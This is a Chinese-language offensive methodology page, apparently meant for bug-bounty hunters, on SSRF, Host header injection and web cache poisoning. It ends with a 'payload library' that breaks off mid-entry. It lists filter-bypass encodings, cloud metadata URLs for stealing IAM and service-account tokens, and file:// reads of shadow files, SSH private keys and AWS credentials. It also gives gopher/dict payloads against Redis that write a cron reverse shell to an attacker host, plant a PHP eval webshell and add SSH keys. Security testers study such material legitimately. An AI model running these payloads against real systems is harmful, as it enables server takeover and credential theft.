# SSRF / Host Header / 缓存投毒

> 视角：黑盒，目标是让目标服务器代我访问内网 / 云元数据 / 投毒缓存

## 1. 一句话说清

- **SSRF**：让服务器替你向"它能到、你不能到"的地方发请求。
- **Host Header 注入**：通过伪造 Host / X-Forwarded-* 让应用错误地构造 URL / 缓存键。
- **缓存投毒**：把恶意响应固化到共享缓存层，让后续用户中招。

SRC 价值：未授权 SSRF→云元数据 → P0 ($3k–$20k)；缓存投毒（管理后台） → P1。

---

## 2. 高频入口点

### 2.1 SSRF 入口（必查）

```
?url=                ?fetch=
?image=              ?img=
?proxy=              ?source=
?path=               ?file=（如果支持 http://）
?callback=           ?webhook=
?next=               ?redirect=
?continue=           ?return=

功能场景:
- 头像 / 远程图片导入
- URL 预览（聊天 / 评论）
- Webhook 回调测试
- RSS / Atom 订阅
- 远程 PDF / Excel / 视频导入
- OAuth redirect / SAML ACS
- 服务器端图片处理（ImageMagick）
- PDF 生成（wkhtmltopdf / Puppeteer）
- 邮件预览（Open Graph fetch）
```

### 2.2 Host / X-Forwarded-* 入口

```
Host
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Port
X-Forwarded-Server
X-Real-IP
X-Original-URL
X-Rewrite-URL
True-Client-IP
X-Client-IP
Forwarded: for=...; host=...
```

---

## 3. 探测手法

### 3.1 SSRF 基础探针（先看是否会发出请求）

```bash
# 1. 用自己的 OOB 服务器（webhook.site / Burp Collaborator / interactsh）
url=https://your-oob-domain.com/abc

# 看 OOB 平台是否收到请求
# 收到 → 至少基本 SSRF 存在
```

### 3.2 内网探测

```
# 回环 / 内网
url=http://127.0.0.1
url=http://127.0.0.1:80
url=http://127.0.0.1:8080
url=http://127.0.0.1:6379       # Redis
url=http://127.0.0.1:9200       # ES
url=http://127.0.0.1:8500       # Consul

url=http://localhost
url=http://10.0.0.1
url=http://172.16.0.1
url=http://192.168.0.1
url=http://[::1]
url=http://[::ffff:127.0.0.1]
```

### 3.3 IP 表示绕过

```
# 全是 127.0.0.1 的等价写法
http://127.0.0.1
http://2130706433              # 十进制
http://017700000001            # 八进制
http://0x7f000001              # 十六进制
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://127.1                   # 简写
http://127.0.1
http://[::1]
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### 3.4 域名绕过

```
http://localtest.me            # → 127.0.0.1（公共 DNS）
http://127.0.0.1.nip.io        # → 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://attacker.com#@127.0.0.1
http://attacker.com\@127.0.0.1
http://attacker.com&@127.0.0.1
http://attacker.com:8080@127.0.0.1
http://[email protected]@127.0.0.1
```

### 3.5 协议绕过

```
file:///etc/passwd
file://localhost/etc/passwd

dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
gopher://127.0.0.1:25/ ... SMTP

ldap://127.0.0.1:389/
sftp://127.0.0.1:22/
tftp://attacker.com/file
ftp://anonymous:test@target/
```

### 3.6 云元数据（必试，价值最高）

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://instance-data/latest/meta-data/

# AWS IMDSv2（v1 关闭时）
1. PUT http://169.254.169.254/latest/api/token  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. GET ... Header: X-aws-ec2-metadata-token: <token>
   → 大部分 SSRF 不能 PUT，IMDSv2 是有效的缓解

# GCP（必须含 Header: Metadata-Flavor: Google）
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure（必须含 Header: Metadata: true）
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

# 华为云
http://169.254.169.254/openstack/latest/meta_data.json

# Kubernetes
http://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### 3.7 重定向绕过

某些应用会"先校验 URL 域名为 safelist，再发请求"，但跟随 302 重定向到内网：

```python
# attacker.com 上
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/

# 让目标以为请求 attacker.com，但实际跟随到内网
url=https://attacker.com/redirect
```

### 3.8 DNS Rebinding

```
# 用 rbndr.us
url=http://7f000001.c0a80101.rbndr.us
# 第 1 次解析返回 127.0.0.1，第 2 次返回 192.168.1.1
# 应用先解析 → 校验 → 再次解析时变内网

# 自建 rebinder：tartarsauce.org / dnsrebind.lock.cmpxchg8b.com
```

### 3.9 Host Header 注入探针

```bash
# 1. 简单 Host 替换
curl -H "Host: attacker.com" https://target/login -i
# 看响应中是否含 attacker.com（密码重置链接 / 重定向）

# 2. X-Forwarded-Host
curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" https://target/login -i

# 3. 双 Host header
curl -H "Host: target.com" -H "Host: attacker.com" https://target/login -i

# 4. Host + 端口
curl -H "Host: target.com:8080@attacker.com" https://target/login -i
```

**关注**：
- 密码重置 / 邮件中的链接里出现 attacker.com → 用攻击者 Host 控制了重置链接
- 重定向到 attacker.com → 开放重定向
- 缓存（Cache-Control: public）将受污染响应缓存

### 3.10 缓存投毒探针

```bash
# 1. 用 X-Forwarded-Host 注入
curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=1 -i
# 看响应里是否含 attacker.com（在 link、canonical、og:url 等位置）

# 2. 命中缓存
# 多次请求同一路径
for i in {1..3}; do curl -I "https://target/?cb=1"; done
# 看 X-Cache: HIT / Age: > 0

# 3. 路径规范化（Web Cache Deception）
curl -I "https://target/profile.php/.css"
curl -I "https://target/account/.js"
# 如果返回了用户态内容并被缓存，下个匿名用户能读

# 4. 双斜杠
curl -I "https://target//admin"
curl -I "https://target/admin;%2f"
```

---

## 4. Bypass 矩阵（SSRF 详见 methodology/02 第 6 章）

| 拦 | 绕 |
|---|---|
| `127.0.0.1` 字符串拦 | 十进制 / 八进制 / 16 进制 IP |
| `localhost` 拦 | `127.1` / `127.0.0.0.1` / `0.0.0.0` |
| `internal`/`private` 关键字 | DNS Rebinding |
| 仅允许 `https://` | URL 编码 / 双重协议 / 重定向 |
| 域名白名单 | `attacker.com#@target.com`、`@` 用户名段绕过 |
| 仅允许某域 | 子域：`legit-attacker.com.evil.com` 解析 |
| 端口黑名单 | 用 22/80/443 等公共端口的内网服务（gopher://） |
| AWS IMDSv2 | 试 v1：`http://169.254.169.254/latest/meta-data/`，部分老实例没启 v2 |

---

## 5. 利用提权 / 横向

```
基础 SSRF
  → 出网回连证明（DNSLog）
  → 内网端口扫描（http://10.0.0.0/8 各端口）
  → 内网 Redis 写 SSH key（gopher://）
  → 云元数据 → IAM 临时凭据（AWS STS / GCP token）
  → IAM 凭据 → 全云控制
  → S3 / OSS bucket 读写
  → 横向到 Kubernetes API
```

参考真实价值：H1 平台 AWS metadata SSRF 报告 $5k–$50k 普遍。

### Host Header 利用链

```
Host 注入 → 密码重置 URL 含 attacker.com
  → 用户点击重置邮件 → 把 reset_token 发到 attacker.com
  → 攻击者拿 token 重置受害者密码

Host 注入 → 缓存中污染了 og:url
  → 受害者看到分享卡片指向 attacker.com → 钓鱼

Web Cache Deception
  → /account/.css 缓存了 alice 的账户页
  → bob 访问 /account/.css → 看到 alice 的数据
```

---

## 6. 真实案例指纹

| 漏洞 | 指纹 |
|------|------|
| Capital One AWS | SSRF → `http://169.254.169.254/latest/meta-data/iam/security-credentials/...` 拿到 IAM 凭据 → S3 全量数据 |
| Shopify GCP | SSRF → `metadata.google.internal/computeMetadata/v1/` |
| HackerOne SSRF | `?url=` 接受 `http://localhost`，命中内网 Mongo |
| Confluence CVE-2019-3396 | 模板注入 + SSRF |
| Jira CVE-2019-8451 | `/plugins/servlet/gadgets/makeRequest?url=...` |
| WeasyPrint / wkhtmltopdf | PDF 生成器解析 HTML 中 `<img src=>` 触发 SSRF |
| Microsoft Outlook | 邮件预览 / 富文本 fetch SSRF |

通用指纹：
- `?url=https://oob.attacker.cc/x` → OOB 平台收到 → 基本 SSRF
- 收到的 User-Agent 含 `wkhtmltopdf` / `Headless Chrome` / `Java/1.x` → 渲染器/HTTP 客户端
- 试 `file:///etc/passwd` 返回 200 → 协议白名单缺
- 试 `http://169.254.169.254/...` 返回 token JSON → 云 metadata 可达

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. 完整请求包（含被 fuzz 的 url 参数）
2. 响应或外带证据（OOB 平台日志截图，含时间、源 IP）
3. 影响升级证明（不实际利用，但展示能拿到的内容）

### 7.2 PoC 模板（云 metadata）

```http
POST /api/preview HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

→ 响应（脱敏）：
HTTP/1.1 200 OK
Content-Type: text/plain

xxx-app-role-prod
（这里证明能拿到 IAM 角色名，未进一步获取临时凭据）
```

### 7.3 Host 注入 PoC

```http
POST /api/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email":"hunter@example.com"}

→ 邮件链接：
https://attacker.com/reset?token=eyJhb...
```

### 7.4 CVSS

```
未授权 SSRF → metadata → 云控制    = 9.8 Critical
未授权 SSRF → 内网端口扫描          CVSS = 7.5
认证 SSRF → 内网                    = 6.5
Host 注入 → 密码重置中毒            = 8.1
缓存投毒 → 用户态泄露                = 7.5
```

### 7.5 影响段

```
通过 /api/preview 接口的 url 参数，攻击者可让服务器代发请求至任意地址。
确认可达：
1. 内网 127.0.0.1 / 10.x.x.x 段服务（端口扫描可行）
2. AWS metadata 端点（已拿到 IAM 角色名 xxx-app-role-prod）
3. 内网 Redis / Mongo 端口（仅做端口可达探测，未发起业务命令）

我未尝试获取 IAM 临时凭据 / 未读取 secret，仅证明可达云 metadata。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__network_intercept` + `mcp__jshook__network_get_requests` | network | 拦截外发请求 / 观察 SSRF 是否实际发出 |
| `mcp__jshook__http2_probe` + `mcp__jshook__http_request_build` | network | HTTP/2 帧构造探测内网 / 绕过过滤 |
| `mcp__jshook__network_replay_request` | network | 重放并修改 host / scheme / port 验证不同协议 |
| `mcp__jshook__proto_infer_state_machine` | protocol-analysis | 自定义协议 SSRF 状态机推断 |

完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：实际拿 IAM 临时凭据后调用 AWS API（`aws s3 ls` 也算）。仅证明可达 metadata 端点。
- **禁**：用 SSRF 触发任何"能改 / 能删"的内网服务（Redis FLUSHALL、写 SSH key、CONFIG SET）。
- **禁**：用 SSRF + gopher 扫整个内网 /8 段。1–3 个目标 IP 验证概念即停。
- **禁**：实际投毒共享缓存（让其他用户看到攻击页面）。在自己的 cache key 上证明能投毒。
- **禁**：Host 注入实际触发用户密码重置邮件（自己邮箱发自己 OK）。
- **限**：SSRF 探测用自己的 OOB 域名，不要用别人的 DNSLog 平台滥用。

## H1 真实案例

_共 108 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | HackerOne | [Server Side Request Forgery (SSRF) via Analytics Reports](https://hackerone.com/reports/2262382) | Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability |
| High | 10000 usd | GitLab | [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) | Summary The Note model has an `attachment` which is provided by a CarrierWave uploader: One of the features this provides is th… |
| High | 6000 usd | Reddit | [Blind SSRF to internal services in matrix preview_link API](https://hackerone.com/reports/1960765) | Summary: Reddit' new chat is based on Matrix software which has preview_link functionality which doesn't filter the URL before … |
| Critical | 3500 usd | Slack | [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419) | The TURN servers used by Slack allow TCP connections and UDP packets to be proxied to the internal network |
| High | — | GitLab | [Server Side Request Forgery mitigation bypass](https://hackerone.com/reports/632101) | Summary This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response |
| High | 4000 usd | GitLab | [Unauthenticated blind SSRF in OAuth Jira authorization controller](https://hackerone.com/reports/398799) | The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability |
| Critical | — | Vimeo | [SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]](https://hackerone.com/reports/549882) | SSRF leaking internal google cloud data through upload function [SSH Keys, etc..] |
| Critical | — | Evernote | [Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion](https://hackerone.com/reports/1189367) | Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion |
| Critical | — | GitLab | [Full Read SSRF on Gitlab's Internal Grafana](https://hackerone.com/reports/878779) | Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerabl… |
| High | — | Omise | [SSRF in webhooks leads to AWS private keys disclosure](https://hackerone.com/reports/508459) | Vulnerability Summary Omise makes use of Amazon AWS as their application environment |
| Critical | 3000 usd | Lark Technologies | [Stored XSS & SSRF in Lark Docs](https://hackerone.com/reports/892049) | Stored XSS & SSRF in Lark Docs |
| High | 2727 usd | TikTok | [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) | External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing |

**命中本类的 weakness 分布：**

- Server-Side Request Forgery (SSRF)：93 条
- Uncategorized → 手工归类：13 条
- Externally Controlled Reference to a Resource in Another Sphere：2 条


## Payload 库

_19 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

**类别分布：** SSRF服务端请求伪造 (12) · 云安全漏洞 (4) · 缓存与CDN安全 (3)

### · SSRF服务端请求伪造

### 基础SSRF攻击  `ssrf-basic`
服务端请求伪造基础攻击技术
子类：**基础攻击** · tags: `ssrf` `server-side` `request`

**前置条件：** 存在URL输入点；服务器会请求用户提供的URL

**攻击链：**

**1. 1. 探测SSRF**
_探测SSRF漏洞_
```
输入URL: http://127.0.0.1
输入URL: http://localhost
输入URL: http://[::1]
观察服务器响应是否包含内网信息
```

**2. 2. 扫描内网端口**
_扫描内网端口_
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
根据响应差异判断端口开放状态
```

**3. 3. 访问内网服务**
_访问内网服务_
```
http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200/_cat/indices
访问内网管理界面或敏感服务
```

**4. 4. 读取本地文件**
_读取本地文件_
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
使用file协议读取本地文件
```

**WAF/EDR 绕过变体：**

**1. IP格式绕过**
_使用不同IP格式绕过_
```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
```

**2. URL解析差异**
_利用URL解析差异_
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
利用URL解析差异绕过
```

**3. DNS重绑定**
_DNS重绑定攻击_
```
使用DNS重绑定服务:
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```

---

### AWS元数据攻击  `ssrf-cloud-aws`
利用SSRF访问AWS EC2元数据服务
子类：**云元数据** · tags: `ssrf` `aws` `metadata` `cloud`

**前置条件：** 存在SSRF漏洞；目标运行在AWS EC2上

**攻击链：**

**1. 1. 访问元数据服务**
_访问AWS元数据服务_
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```

**2. 2. 获取IAM凭证**
_获取IAM临时凭证_
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
获取角色名后:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**3. 3. 获取用户数据**
_获取实例用户数据_
```
http://169.254.169.254/latest/user-data/
可能包含敏感信息、API密钥、启动脚本
```

**4. 4. 使用IMDSv2绕过**
_绕过IMDSv2保护_
```
如果IMDSv2被强制:
1. 先获取token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. 使用token访问:
Header: X-aws-ec2-metadata-token: TOKEN
```

**WAF/EDR 绕过变体：**

**1. IP编码变体绕过**
_通过十进制、十六进制、八进制及IPv6映射等IP地址编码方式绕过169.254.169.254黑名单检测_
```
# 十进制整数:
http://2852039166/latest/meta-data/
# 十六进制:
http://0xA9FEA9FE/latest/meta-data/
# 八进制:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6映射:
http://[::ffff:169.254.169.254]/latest/meta-data/
# 混合编码:
http://0xA9.0376.169.0xFE/latest/meta-data/
```

**2. DNS重绑定与重定向链绕过**
_利用DNS重绑定使域名在验证时解析为安全IP而实际请求时解析为元数据地址，或通过HTTP重定向链和非标准协议绕过_
```
# DNS重绑定(使用rebind服务):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# 第一次解析到允许的IP，第二次解析到169.254.169.254

# 重定向链:
# 在attacker.com设置302跳转到http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema变体:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```

---

### GCP元数据攻击  `ssrf-cloud-gcp`
利用SSRF攻击Google Cloud元数据服务
子类：**GCP元数据** · tags: `ssrf` `gcp` `cloud` `metadata`

**前置条件：** 存在SSRF漏洞；目标运行在GCP环境

**攻击链：**

**1. 1. 访问元数据服务**
_访问GCP元数据端点_
```
http://metadata.google.internal/computeMetadata/v1/
需要添加Header:
Metadata-Flavor: Google
```

**2. 2. 获取访问令牌**
_获取服务账户令牌_
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
返回OAuth访问令牌
```

**3. 3. 获取服务账户信息**
_获取服务账户邮箱和别名_
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
```

**4. 4. 获取项目信息**
_获取项目ID_
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

**5. 5. 获取SSH密钥**
_获取SSH公钥_
```
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

**6. 6. 获取Kubelet凭据**
_获取GKE集群信息_
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
获取Kubernetes环境变量
```

**WAF/EDR 绕过变体：**

**1. 使用IP地址**
_绕过域名过滤_
```
http://169.254.169.254/computeMetadata/v1/
使用内网IP代替域名
```

---

### Azure元数据攻击  `ssrf-cloud-azure`
利用SSRF攻击Azure元数据服务
子类：**Azure元数据** · tags: `ssrf` `azure` `cloud` `metadata`

**前置条件：** 存在SSRF漏洞；目标运行在Azure环境

**攻击链：**

**1. 1. 访问元数据服务**
_访问Azure元数据端点_
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
需要添加Header:
Metadata: true
```

**2. 2. 获取访问令牌**
_获取托管身份令牌_
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
返回Azure AD访问令牌
```

**3. 3. 获取计算信息**
_获取计算实例信息_
```
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
返回VM详细信息
```

**4. 4. 获取网络信息**
_获取网络配置_
```
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
返回网络配置信息
```

**5. 5. 获取用户数据**
_获取用户数据_
```
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text
返回用户自定义数据
```

**WAF/EDR 绕过变体：**

**1. 绕过Metadata头检查**
_绕过请求头验证_
```
使用HTTP请求走私或重定向绕过Metadata头检查
```

---

### SSRF协议利用  `ssrf-protocol`
利用各种协议进行SSRF攻击
子类：**协议利用** · tags: `ssrf` `protocol` `file` `gopher`

**前置条件：** 存在SSRF漏洞；服务器支持多种协议

**攻击链：**

**1. 1. File协议**
_使用File协议读取文件_
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
读取本地文件
```

**2. 2. Dict协议**
_使用Dict协议探测服务_
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
探测内网服务
```

**3. 3. Gopher协议**
_使用Gopher协议攻击内网服务_
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
构造Redis命令
```

**4. 4. LDAP协议**
_使用LDAP协议_
```
ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
触发LDAP查询
```

**5. 5. TFTP协议**
_使用TFTP协议_
```
tftp://attacker.com/file
触发TFTP请求
```

**WAF/EDR 绕过变体：**

**1. 协议大小写绕过**
_大小写混合绕过_
```
FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/
```

---

### Gopher协议攻击  `ssrf-gopher`
利用Gopher协议攻击内网服务
子类：**Gopher攻击** · tags: `ssrf` `gopher` `redis` `mysql`

**前置条件：** 存在SSRF漏洞；服务器支持Gopher协议

**攻击链：**

**1. 1. Gopher基础格式**
_Gopher协议格式_
```
gopher://<host>:<port>/_<payload>
_后面是实际发送的数据
需要URL编码
```

**2. 2. 攻击Redis**
_写入cron任务反弹Shell_
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**3. 3. 攻击MySQL**
_攻击MySQL数据库_
```
gopher://127.0.0.1:3306/_<MySQL协议数据包>
需要构造MySQL协议格式的数据
```

**4. 4. 攻击FastCGI**
_攻击PHP-FPM_
```
gopher://127.0.0.1:9000/_<FastCGI数据包>
构造PHP-FPM攻击载荷
```

**5. 5. 发送HTTP请求**
_发送HTTP请求_
```
gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
构造HTTP请求攻击内网
```

**WAF/EDR 绕过变体：**

**1. 双重URL编码**
_双重URL编码绕过_
```
gopher://127.0.0.1:6379/_%252a%250d%250a...
双重编码绕过
```

---

### Dict协议攻击  `ssrf-dict`
利用Dict协议探测和攻击内网服务
子类：**Dict协议** · tags: `ssrf` `dict` `redis` `memcached`

**前置条件：** 存在SSRF漏洞；服务器支持Dict协议

**攻击链：**

**1. 1. Dict协议格式**
_Dict协议基础格式_
```
dict://<host>:<port>/<command>
发送命令到目标服务
```

**2. 2. 探测Redis**
_探测Redis服务_
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
获取Redis信息
```

**3. 3. 探测Memcached**
_探测Memcached服务_
```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
获取Memcached信息
```

**4. 4. Redis写入文件**
_写入WebShell_
```
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_URL编码绕过关键字过滤_
```
dict://127.0.0.1:6379/%73%65%74%20...
URL编码命令
```

---

### File协议攻击  `ssrf-file`
利用File协议读取本地文件
子类：**File协议** · tags: `ssrf` `file` `lfi` `read`

**前置条件：** 存在SSRF漏洞；服务器支持File协议

**攻击链：**

**1. 1. Linux敏感文件**  _[linux]_
_读取Linux敏感文件_
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline
```

**2. 2. Windows敏感文件**  _[windows]_
_读取Windows敏感文件_
```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/inetpub/logs/logfiles/
```

**3. 3. Web配置文件**
_读取Web应用配置_
```
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app/config/database.yml
file:///app/.env
```

**4. 4. 云环境文件**
_读取云环境凭据_
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///home/user/.aws/credentials
```

**5. 5. SSH密钥**
_读取SSH私钥_
```
file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///root/.ssh/id_rsa
```

**WAF/EDR 绕过变体：**

**1. 大小写混合**
_大小写混合绕过_
```
FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD
```

---

### SSRF绕过技术  `ssrf-bypass`
各种绕过SSRF过滤的技术
子类：**绕过技术** · tags: `ssrf` `bypass` `waf` `filter`

**前置条件：** 存在SSRF漏洞；存在过滤机制

**攻击链：**

**1. 1. IP格式绕过**
_使用不同IP格式表示127.0.0.1_
```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
http://127.0.0.1.xip.io
```

**2. 2. URL解析差异**
_利用URL解析差异_
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
http://attacker.com\.127.0.0.1/
```

**3. 3. 重定向绕过**
_利用HTTP重定向_
```
http://attacker.com/redirect?url=http://127.0.0.1
使用短链接服务重定向到内网
```

**4. 4. DNS重绑定**
_DNS重绑定攻击_
```
http://7f000001.cip.cc
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```

**5. 5. IPv6绕过**
_使用IPv6地址绕过_
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
使用IPv6本地地址
```

**6. 6. 编码绕过**
_使用编码绕过_
```
http://%31%32%37%2e%30%2e%30%2e%31 (URL编码)
http://127.0.0.1%00attacker.com (空字节)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)
```

**WAF/EDR 绕过变体：**

**1. 组合绕过**
_组合多种绕过技术_
```
http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
多种格式组合
```

---

### DNS重绑定攻击  `ssrf-dns-rebinding`
利用DNS重绑定绕过SSRF防护
子类：**DNS重绑定** · tags: `ssrf` `dns` `rebinding` `bypass`

**前置条件：** 存在SSRF漏洞；存在DNS解析验证

**攻击链：**

**1. 1. DNS重绑定原理**
_DNS重绑定原理_
```
第一次DNS查询：返回外网IP（通过验证）
第二次DNS查询：返回内网IP（实际访问）
利用TTL=0或短TTL
```

**2. 2. 使用公开服务**
_使用DNS重绑定服务_
```
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
```

**3. 3. 自建DNS服务器**
_自建DNS重绑定服务器_
```
# 使用dnspython搭建
from dnslib import *
class RebindResolver:
    def __init__(self):
        self.count = 0
    def resolve(self, request):
        self.count += 1
        if self.count % 2 == 1:
            return "1.2.3.4"  # 外网IP
        else:
            return "127.0.0.1"  # 内网IP
```

**4. 4. 攻击流程**
_完整攻击流程_
```
1. 注册域名指向自建DNS服务器
2. 配置DNS服务器返回两个IP
3. 使用该域名发起SSRF请求
4. 第一次验证通过，第二次访问内网
```

**WAF/EDR 绕过变体：**

**1. 多IP响应**
_利用多IP响应_
```
DNS响应包含多个A记录
服务器可能选择不同的IP
```

---

### SSRF攻击Redis  `ssrf-redis`
利用SSRF攻击内网Redis服务
子类：**Redis攻击** · tags: `ssrf` `redis` `rce` `webshell`

**前置条件：** 存在SSRF漏洞；内网存在未授权Redis

**攻击链：**

**1. 1. 探测Redis**
_探测Redis服务_
```
dict://127.0.0.1:6379/info
或使用Gopher:
gopher://127.0.0.1:6379/_INFO
```

**2. 2. 写入WebShell**
_写入WebShell到Web目录_
```
# 使用Dict协议
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

**3. 3. 写入SSH公钥**
_写入SSH公钥_
```
dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save
```

**4. 4. 写入Cron任务**  _[linux]_
_写入Cron反弹Shell_
```
dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
